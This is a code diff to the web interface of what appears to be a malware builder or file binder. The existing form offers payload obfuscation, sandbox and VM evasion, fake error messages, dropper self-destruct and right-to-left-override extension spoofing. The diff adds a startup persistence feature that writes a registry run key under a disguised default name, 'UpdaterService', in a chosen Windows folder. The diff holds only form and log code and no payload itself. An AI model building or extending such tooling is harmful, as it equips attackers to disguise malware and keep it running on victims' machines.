@@ -12,7 +12,7 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2, Bot } from 'lucide-react';
+import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2, Bot, Link2 } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
@@ -41,6 +41,9 @@ const formSchema = z.object({
   checkRam: z.boolean().default(true),
   checkVmProcesses: z.boolean().default(true),
   sandboxAbortMessage: z.string().optional(),
+  enablePersistence: z.boolean().default(false),
+  installPath: z.enum(['TEMP', 'APPDATA', 'SystemRoot']).default('TEMP'),
+  registryKeyName: z.string().optional(),
 });
 
 const outputFormats = {
@@ -81,6 +84,9 @@ export default function MergingStationPage() {
       checkRam: true,
       checkVmProcesses: true,
       sandboxAbortMessage: 'This application cannot run in a virtual environment.',
+      enablePersistence: false,
+      installPath: 'TEMP',
+      registryKeyName: 'UpdaterService',
     },
   });
 
@@ -92,6 +98,7 @@ export default function MergingStationPage() {
   const watchObfuscationType = form.watch('obfuscationType');
   const watchShowFakeError = form.watch('showFakeError');
   const watchEnableSandboxDetection = form.watch('enableSandboxDetection');
+  const watchFileless = form.watch('fileless');
 
  const applyExtensionSpoofing = (filename: string): string => {
     const parts = filename.split('.');
@@ -155,6 +162,7 @@ export default function MergingStationPage() {
         if (values.obfuscationType !== 'none') log(`Payloads obfuscated with ${values.obfuscationType.toUpperCase()}`);
         if (values.useFragmentation) log(`Payloads split into fragments.`);
         if (values.fileless) log(`Fileless execution enabled.`);
+        else if (values.enablePersistence) log(`Persistence enabled in ${values.installPath} with key '${values.registryKeyName}'`);
         if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
         if (values.showFakeError) log(`Fake error message enabled.`);
         if (values.selfDestruct) log(`Self-destruct enabled.`);
@@ -296,12 +304,22 @@ export default function MergingStationPage() {
 
                </div>
 
-                <div className="md:col-span-2">
+                <div className="md:col-span-2 grid md:grid-cols-2 gap-6">
                     <Card>
                          <CardContent className="p-4 space-y-4">
                             <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription className="text-xs">Use RLO character to mask the true file extension.</FormDescription></div></FormItem> )}/>
                             <FormField control={form.control} name="selfDestruct" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Self-Destruct after Execution</FormLabel><FormDescription className="text-xs">Remove the dropper script after it runs.</FormDescription></div></FormItem> )}/>
                          </CardContent>
+                    </Card>
+                    <Card className={watchFileless ? 'opacity-50' : ''}>
+                        <CardHeader className="pb-2"><CardTitle className="text-lg">5. Persistence</CardTitle></CardHeader>
+                        <CardContent className="space-y-4">
+                            <fieldset disabled={watchFileless}>
+                                <FormField control={form.control} name="enablePersistence" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Persistence</FormLabel><FormDescription>Add to registry to run on startup.</FormDescription></div></FormItem> )}/>
+                                <FormField control={form.control} name="installPath" render={({ field }) => ( <FormItem className="mt-4"><FormLabel>Install Location</FormLabel><Select onValueChange={field.onChange} defaultValue={field.value}><FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl><SelectContent><SelectItem value="TEMP">%TEMP%</SelectItem><SelectItem value="APPDATA">%APPDATA%</SelectItem><SelectItem value="SystemRoot">%SystemRoot% (Admin)</SelectItem></SelectContent></Select></FormItem> )}/>
+                                <FormField control={form.control} name="registryKeyName" render={({ field }) => ( <FormItem className="mt-4"><FormLabel>Registry Key Name</FormLabel><FormControl><Input {...field} /></FormControl></FormItem> )}/>
+                            </fieldset>
+                        </CardContent>
                     </Card>
                 </div>
 
